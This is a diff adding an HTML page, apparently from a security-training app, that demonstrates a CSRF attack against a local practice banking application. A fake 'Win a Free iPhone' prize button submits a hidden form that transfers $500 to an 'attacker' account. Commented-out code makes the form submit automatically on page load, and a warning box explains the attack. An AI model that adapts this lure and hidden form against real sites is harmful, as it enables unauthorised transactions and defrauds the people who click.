@@ -1,0 +1,89 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Win a Free iPhone! 🎁</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+</head>
+<body class="bg-gradient-to-br from-purple-600 to-pink-600 min-h-screen flex items-center justify-center">
+    <div class="container mx-auto px-4 py-8 max-w-2xl">
+        <!-- Fake Prize Page -->
+        <div class="bg-white rounded-lg shadow-2xl p-8 text-center">
+            <h1 class="text-4xl font-bold text-gray-800 mb-4">
+                🎉 Congratulations! 🎉
+            </h1>
+            <p class="text-xl text-gray-600 mb-6">
+                You've been selected to win a FREE iPhone 15 Pro!
+            </p>
+            <div class="bg-yellow-100 border-2 border-yellow-400 rounded-lg p-6 mb-6">
+                <p class="text-2xl font-bold text-yellow-800">
+                    Click the button below to claim your prize!
+                </p>
+            </div>
+
+            <!-- Fake button that triggers the attack -->
+            <button
+                onclick="document.getElementById('csrfForm').submit(); alert('Prize claimed! Check your email.');"
+                class="bg-green-500 hover:bg-green-600 text-white text-xl font-bold px-8 py-4 rounded-lg shadow-lg transform hover:scale-105 transition cursor-pointer"
+            >
+                Claim My Free iPhone! 📱
+            </button>
+
+            <p class="text-sm text-gray-500 mt-4">
+                * No purchase necessary. Limited time offer.
+            </p>
+        </div>
+
+        <!-- Warning Box -->
+        <div class="mt-8 bg-red-500/20 border border-red-500 rounded-lg p-6 text-white">
+            <h3 class="font-bold text-xl mb-2">⚠️ CSRF Attack Demo</h3>
+            <p class="mb-2">
+                This is a demonstration of a CSRF attack. When a user clicks the "Claim" button,
+                a hidden form is submitted to the banking application, transferring money without their knowledge.
+            </p>
+            <details class="mt-4">
+                <summary class="cursor-pointer text-yellow-300 hover:text-yellow-200">View Attack Code</summary>
+                <pre class="mt-2 bg-black/30 p-4 rounded text-sm overflow-x-auto"><code>&lt;!-- Hidden CSRF Attack Form --&gt;
+&lt;form id="csrfForm" method="POST"
+      action="http://localhost:5000/challenge/csrf-attack/transfer"&gt;
+    &lt;input type="hidden" name="to_account" value="attacker"&gt;
+    &lt;input type="hidden" name="amount" value="500"&gt;
+&lt;/form&gt;
+
+&lt;script&gt;
+    // Auto-submit on page load (more stealthy)
+    // window.onload = () => document.getElementById('csrfForm').submit();
+&lt;/script&gt;</code></pre>
+            </details>
+        </div>
+
+        <!-- Back Button -->
+        <div class="text-center mt-6">
+            <a href="{{ url_for('challenge_csrf-attack.index') }}"
+               class="text-white hover:text-yellow-300 underline">
+                ← Back to Banking App
+            </a>
+        </div>
+    </div>
+
+    <!-- Hidden CSRF Attack Form -->
+    <!-- This form will be submitted when the user clicks the fake prize button -->
+    <form id="csrfForm" method="POST" action="/challenge/csrf-attack/transfer" style="display: none;">
+        <input type="hidden" name="to_account" value="attacker">
+        <input type="hidden" name="amount" value="500">
+    </form>
+
+    <!--
+        Alternative: Auto-submit on page load (more realistic attack)
+        Uncomment this to make the attack happen automatically:
+    -->
+    <!--
+    <script>
+        window.onload = function() {
+            document.getElementById('csrfForm').submit();
+        };
+    </script>
+    -->
+</body>
+</html>
